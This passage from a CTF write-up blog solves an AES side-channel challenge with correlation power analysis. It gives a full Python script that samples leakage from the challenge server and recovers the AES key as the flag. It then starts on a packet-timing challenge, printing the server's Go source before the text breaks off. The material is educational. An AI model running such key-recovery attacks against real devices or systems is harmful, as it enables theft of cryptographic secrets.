&lt;p&gt;However, I remembered that in PicoCTF 2023 there was a very similar challenge series named &lt;code&gt;Power Analysis&lt;/code&gt;, which also featured RSA side-channel attacks.&lt;/p&gt;
&lt;p&gt;Searching for writeups on it, I found &lt;a href=&#34;https://eshard.com/posts/pico-ctf-power-analysis-challenges&#34;&gt;this article&lt;/a&gt;, where their writeup for &lt;code&gt;PowerAnalysis: Part 1&lt;/code&gt; proved to be extremely helpful.&lt;/p&gt;

  &lt;img src=&#34;./img/cpa-blog.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px;&#34;  /&gt;


&lt;p&gt;There are a few differences between that challenge and the one we are trying to solve:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;we are given less samples (50 instead of 500)&lt;/li&gt;
&lt;li&gt;the plaintexts are longer (32 bytes instead of 16)&lt;/li&gt;
&lt;li&gt;the key we are trying to recover is longer (also 32 bytes instead of 16), but I didn&amp;rsquo;t know this until later on&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can easily solve the first issue by connecting multiple times to the server and gathering a large number of samples, and for the second issue, since AES block sizes are usually 16 bytes, I simply cut off the last 16 bytes of the 32 bytes for now.&lt;/p&gt;
&lt;p&gt;Here is the code to collect the samples:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;plaintexts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;leaks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;aes-observed.zajebistyc.tf&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        resp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(resp[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])[:&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#75715e&#34;&gt;# only consider first 16 bytes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; float(resp[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        arr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [v &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; v &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; pt]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        plaintexts&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(arr))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        leaks&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append([leak,leak]) &lt;span style=&#34;color:#75715e&#34;&gt;# has to be in this format for the attack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We collect 10000 samples in total, which should be sufficient to perform the attack and recover the key.&lt;/p&gt;
&lt;p&gt;Next, we perform the CPA attack in the exact same way as the article.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ths &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_ths_from_ram(samples&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(leaks), plaintext&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array(plaintexts))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CPAAttack(selection_function&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;selection_functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encrypt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FirstSubBytes(), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          model&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Monobit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;), 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          discriminant&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nanmax,  &lt;span style=&#34;color:#75715e&#34;&gt;# Positive correlation expected&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                          convergence_step&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;attack&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run(scared&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Container(ths))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;found_key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nanargmax(attack&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;scores, axis&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;astype(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uint8&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(found_key)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Combining the code and running it, we recover the key in decimal format: &lt;code&gt;[112  52 123  79 115  99 105 108 108 111 115  99 111 112 101 115]&lt;/code&gt;. A quick from decimal in CyberChef gives us the flag:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;p4{Oscilloscopes
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, it doesn&amp;rsquo;t seem to be the full flag. We assumed at the start that the key size is 16 bytes as it is the most common key size, but AES keys can actually be 16, 24 or 32 bytes.&lt;/p&gt;
&lt;p&gt;Remembering that we neglected the last 16 bytes of the plaintext, we re-run the script - this time, only considering the last 16 bytes of the plaintext.&lt;/p&gt;
&lt;p&gt;We simply modify the line &lt;code&gt;pt = bytes.fromhex(resp[0])[:16]&lt;/code&gt; to &lt;code&gt;[16:]&lt;/code&gt; to do so.&lt;/p&gt;
&lt;p&gt;This works as we recover the last 16 bytes of the key, which is &lt;code&gt;? Still_matter!}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The full flag we get is &lt;code&gt;p4{Oscilloscopes? Still_matter!}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Full cleaned solve script:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;solve.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *

import numpy as np
from tqdm.notebook import tqdm
from estraces import read_ths_from_ram
import scared

plaintexts1 = []
plaintexts2 = []
leaks = [] # voltage

for _ in range(200):
    r = remote(&amp;#34;aes-observed.zajebistyc.tf&amp;#34;,9999)
    r.recvline()
    for i in range(50):
        resp = r.recvline().strip().decode().split(&amp;#34;\t&amp;#34;)
        pt1 = bytes.fromhex(resp[0])[:16]
        pt2 = bytes.fromhex(resp[0])[16:]
        leak = float(resp[1])
        arr = [v for v in pt1]
        plaintexts1.append(np.array(arr))
        arr = [v for v in pt2]
        plaintexts2.append(np.array(arr))
        leaks.append([leak,leak]) # has to be in this format for the attack
    r.close()

# Run attack for first 16 bytes of key
ths = read_ths_from_ram(samples=np.array(leaks), plaintext=np.array(plaintexts1))
attack = scared.CPAAttack(selection_function=scared.aes.selection_functions.encrypt.FirstSubBytes(), 
                          model=scared.Monobit(0), 
                          discriminant=scared.nanmax,  # Positive correlation expected
                          convergence_step=50)
attack.run(scared.Container(ths))

found_key = np.nanargmax(attack.scores, axis=0).astype(&amp;#39;uint8&amp;#39;)

print(found_key)

# Run attack for last 16 bytes of key
ths = read_ths_from_ram(samples=np.array(leaks), plaintext=np.array(plaintexts2))
attack = scared.CPAAttack(selection_function=scared.aes.selection_functions.encrypt.FirstSubBytes(), 
                          model=scared.Monobit(0), 
                          discriminant=scared.nanmax,  # Positive correlation expected
                          convergence_step=50)
attack.run(scared.Container(ths))

found_key = np.nanargmax(attack.scores, axis=0).astype(&amp;#39;uint8&amp;#39;)

print(found_key)

# p4{Oscilloscopes? Still_matter!}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;h1 id=&#34;pepega-packets-misc---5-solves&#34;&gt;Pepega Packets (misc) - 5 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you be faster enough?&lt;br&gt;
&lt;code&gt;http://10.0.XXX.2:80&lt;/code&gt;&lt;br&gt;
NOTE: Every team have separate ip address, please look on your paper from sanity check :)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is probably the hardest I&amp;rsquo;ve ever cheese&amp;rsquo;d a challenge - and it was first blood as well&amp;hellip;&lt;/p&gt;
&lt;p&gt;We are given the server&amp;rsquo;s code:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;4&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;go&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.go&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-go&#34; &gt;&lt;code&gt;
package main

import (
	&amp;#34;context&amp;#34;
	&amp;#34;errors&amp;#34;
	&amp;#34;fmt&amp;#34;
	&amp;#34;github.com/florianl/go-nflog&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/layers&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/packet&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/packet/ipv4&amp;#34;
	&amp;#34;github.com/ghedo/go.pkt/packet/tcp&amp;#34;
	&amp;#34;log&amp;#34;
	&amp;#34;net&amp;#34;
	&amp;#34;net/http&amp;#34;
	&amp;#34;os&amp;#34;
	&amp;#34;os/exec&amp;#34;
	&amp;#34;strconv&amp;#34;
	&amp;#34;strings&amp;#34;
	&amp;#34;sync&amp;#34;
	&amp;#34;syscall&amp;#34;
	&amp;#34;time&amp;#34;
)

type PacketInfo struct {
	ArrivedAt time.Time

	FromIP   net.IP
	FromPort uint16

	ToIP   net.IP
	ToPort uint16
}

func GetPacketInfo(data []byte) (*PacketInfo, error) {
	netPacket, err := layers.UnpackAll(data, packet.IPv4)
	if err != nil {
		return nil, err
	}

	ipInfo, ok := netPacket.(*ipv4.Packet)
	if !ok {
		return nil, errors.New(&amp;#34;not ip packet&amp;#34;)
	}

	tcpInfo, ok := netPacket.Payload().(*tcp.Packet)
	if !ok {
		return nil, errors.New(&amp;#34;not tcp packet&amp;#34;)
	}

	return &amp;amp;PacketInfo{
		FromIP:   ipInfo.SrcAddr,
		FromPort: tcpInfo.SrcPort,
		ToIP:     ipInfo.DstAddr,
		ToPort:   tcpInfo.DstPort,
	}, nil
}

func GetPacketStream() (chan PacketInfo, error) {
	ctx, cancel := context.WithCancel(context.Background())
	config := nflog.Config{
		Group:    nflogGroup,
		Copymode: nflog.NfUlnlCopyPacket,
		Bufsize:  64,
		Logger:   log.New(os.Stderr, &amp;#34;nflog&amp;#34;, log.LstdFlags),
	}

	nf, err := nflog.Open(&amp;amp;config)
	if err != nil {
		cancel()
		return nil, err
	}

	go func() {
		&amp;lt;-ctx.Done()
		nf.Close()
	}()
	packetStream := make(chan PacketInfo, 65000)

	funcHook := func(msg nflog.Msg) int {
		var packetData []byte
		if msg, exists := msg[nflog.AttrPayload]; exists {
			if msg, ok := msg.([]byte); ok {
				packetData = msg
			}
		}

		var packetTime time.Time
		if msg, exists := msg[nflog.AttrTimestamp]; exists {
			if msg, ok := msg.(time.Time); ok {
				packetTime = msg
			}
		}

		info, err := GetPacketInfo(packetData)
		if err != nil {
			log.Printf(&amp;#34;invalid packet raw=%q&amp;#34;, packetData)
			return 0
		}
		info.ArrivedAt = packetTime

		select {
		case packetStream &amp;lt;- *info:
		default:
			log.Fatalf(&amp;#34;closed channel or overflow&amp;#34;)
			cancel()
		}
		return 0
	}

	err = nf.Register(ctx, funcHook)
	if err != nil {
		cancel()
		return nil, err
	}

	return packetStream, nil
}

func workerFirewall() {
	packetStream, err := GetPacketStream()
	if err != nil {
		log.Fatal(&amp;#34;packetStream err&amp;#34;, err)
	}
	for pkt := range packetStream {
		if GlobalDB.Ban(pkt.FromIP.String(), time.Minute) {
			log.Printf(&amp;#34;banning suspicious connection = %&amp;#43;v\n&amp;#34;, pkt)
		}
	}
}

type localDB struct {
	mu     sync.RWMutex
	banned map[string]time.Time
}

func NewLocalDB() *localDB {
	return &amp;amp;localDB{
		banned: make(map[string]time.Time),
	}
}

func (c *localDB) Ban(remoteIP string, expireDuration time.Duration) bool {
	c.mu.Lock()
	c.banned[remoteIP] = time.Now().Add(expireDuration)
	c.mu.Unlock()
	return true
}

func (c *localDB) IsBanned(remoteIP string) bool {
	c.mu.RLock()
	expireAt, exists := c.banned[remoteIP]
	c.mu.RUnlock()
	if !exists {
		return false
	}
	if time.Since(expireAt).Seconds() &amp;gt; 0 {
		return false
	}
	return true
}

func setupNftables() {
	nftScript := `#!/usr/sbin/nft -f

	table inet chall_pepega_%interface% {}
	delete table inet chall_pepega_%interface%
	table inet chall_pepega_%interface% {
		chain input {
			type filter hook input priority 0; policy accept;
			iif &amp;#34;%interface%&amp;#34; tcp dport %port% log group %nfgroup%
		}
	}
	`
	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%interface%&amp;#34;, interfaceString)
	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%port%&amp;#34;, portString)
	nftScript = strings.ReplaceAll(nftScript, &amp;#34;%nfgroup%&amp;#34;, strconv.Itoa(int(nflogGroup)))

	cmd := exec.Command(&amp;#34;/usr/sbin/nft&amp;#34;, &amp;#34;-f&amp;#34;, &amp;#34;-&amp;#34;)
	cmd.Stdin = strings.NewReader(nftScript)

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf(&amp;#34;Error executing nft script: err=%&amp;#43;v\nerror output:\n%s\n&amp;#34;, err, output)
	}
}

func getInterfaceIP(interfaceName string) (net.IP, error) {
	iface, err := net.InterfaceByName(interfaceName)
	if err != nil {
		return nil, err
	}

	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}

	for _, addr := range addrs {
		ipNet, ok := addr.(*net.IPNet)
		if ok &amp;amp;&amp;amp; !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				return ipNet.IP, nil
			}
		}
	}

	return nil, fmt.Errorf(&amp;#34;no IP address found for interface %s&amp;#34;, interfaceName)
}

func workerHttp() {
	http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintln(w, &amp;#34;Welcome to the 🐸packets!!! Now please get fast 🐸 flag!&amp;#34;)
	})
	http.HandleFunc(&amp;#34;/flag&amp;#34;, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set(&amp;#34;Content-Type&amp;#34;, &amp;#34;text/plain&amp;#34;)
		flusher, ok := w.(http.Flusher)
		if !ok {
			http.Error(w, &amp;#34;Streaming not supported&amp;#34;, http.StatusInternalServerError)
			return
		}
		remoteAddrStr, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			http.Error(w, fmt.Sprintf(&amp;#34;Error extracting remote address, ip=%s&amp;#34;, r.RemoteAddr), http.StatusInternalServerError)
			return
		}
		remoteAddr := net.ParseIP(remoteAddrStr).To4()
		if len(remoteAddr) != 4 {
			http.Error(w, fmt.Sprintf(&amp;#34;Error parsing remote address, ip=%s, ip=%s&amp;#34;, r.RemoteAddr, remoteAddrStr), http.StatusInternalServerError)
			return
		}

		for i := 1; i &amp;lt;= 5; i&amp;#43;&amp;#43; {
			fmt.Fprintf(w, &amp;#34;Validating your request [%d/5], please wait 🐸🐸🐸\n&amp;#34;, i)
			flusher.Flush()

			if GlobalDB.IsBanned(remoteAddr.String()) {
				fmt.Fprintln(w, &amp;#34;Sad 🐸 You are banned 😢&amp;#34;)
				return
			}
			time.Sleep(time.Second)
		}

		fmt.Fprintf(w, &amp;#34;Here you go!!! 🐸 Flag: %s&amp;#34;, flagString)
	})

	serverIP, err := getInterfaceIP(interfaceString)
	if err != nil {
		log.Fatal(&amp;#34;getInterfaceIP err: &amp;#34;, err)
	}
	log.Printf(&amp;#34;Listen on %s:%s\n&amp;#34;, serverIP, portString)

	server := &amp;amp;http.Server{
		Addr:         serverIP.String() &amp;#43; &amp;#34;:&amp;#34; &amp;#43; portString,
		Handler:      http.DefaultServeMux,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}
	listener, err := net.Listen(&amp;#34;tcp&amp;#34;, server.Addr)
	if err != nil {
		log.Fatal(&amp;#34;Error creating listener: &amp;#34;, err)
	}
	rawListener, err := listener.(*net.TCPListener).File()
	if err != nil {
		log.Fatal(&amp;#34;Error getting raw listener file: &amp;#34;, err)
	}
	if err := syscall.SetsockoptString(int(rawListener.Fd()), syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, interfaceString); err != nil {
		log.Fatal(&amp;#34;Error setting SO_BINDTODEVICE option: &amp;#34;, err)
	}
	if err := server.Serve(listener); err != nil {
		log.Fatal(&amp;#34;server.ListenAndServe err: &amp;#34;, err)
	}
}

var GlobalDB *localDB
var flagString string
var portString string
var interfaceString string
var nflogGroup uint16

func main() {
	flagString = os.Getenv(&amp;#34;FLAG&amp;#34;)
	if len(flagString) == 0 {
		log.Fatal(&amp;#34;flag is empty&amp;#34;)
	}

	portString = os.Getenv(&amp;#34;LISTEN_PORT&amp;#34;)
	if len(portString) == 0 {
		portString = &amp;#34;8080&amp;#34;
	}

	interfaceString = os.Getenv(&amp;#34;LISTEN_INTERFACE&amp;#34;)
	if len(interfaceString) == 0 {
		interfaceString = &amp;#34;eth0&amp;#34;
	}

	nflogGroupStr := os.Getenv(&amp;#34;NFLOG_GROUP&amp;#34;)
	if len(nflogGroupStr) == 0 {
		nflogGroupStr = &amp;#34;100&amp;#34;
	}
	nflogGroup64, err := strconv.ParseUint(nflogGroupStr, 10, 16)
	if err != nil {
		log.Fatal(&amp;#34;invalid nflog group&amp;#34;)
	}
	nflogGroup = uint16(nflogGroup64)

	GlobalDB = NewLocalDB()

	setupNftables()

	go workerFirewall()
	workerHttp()
}

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;We can see that to get the flag, all you have to do is to request the &lt;code&gt;/flag&lt;/code&gt; endpoint and if you&amp;rsquo;re not banned for 5 seconds, it&amp;rsquo;ll give you the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Validating your request [%d/5], please wait 🐸🐸🐸\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;flusher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Flush&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GlobalDB&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;IsBanned&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;remoteAddr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;String&lt;/span&gt;()) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintln&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Sad 🐸 You are banned 😢&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sleep&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;time&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Second&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fprintf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;w&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Here you go!!! 🐸 Flag: %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;flagString&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It checks if your IP (&lt;code&gt;remoteAddr&lt;/code&gt;) is banned every second for 5 seconds, and we can find that our IP gets banned for 1 minute when we connect to the server initially in &lt;code&gt;workerFirewall()&lt;/code&gt;&lt;/p&gt;
